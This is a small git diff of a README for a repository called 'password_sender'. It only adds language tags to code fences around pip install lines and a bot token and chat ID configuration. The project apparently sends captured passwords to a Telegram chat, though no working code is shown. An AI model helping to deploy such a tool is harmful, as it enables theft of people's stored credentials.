@@ -7,7 +7,7 @@ git clone https://github.com/abdurohman-karim/password_sender.git
 ```
 
 ## Installation Libraries
-```
+``` bash
 pip install python-telegram-bot
 
 pip install pycryptodome
@@ -18,7 +18,7 @@ pip install pywin32
 
 
 ## How to use 
-```
+``` python
 bot_token = 'BOT_TOKEN'
 chat_id = '-1001500553277'
 ```
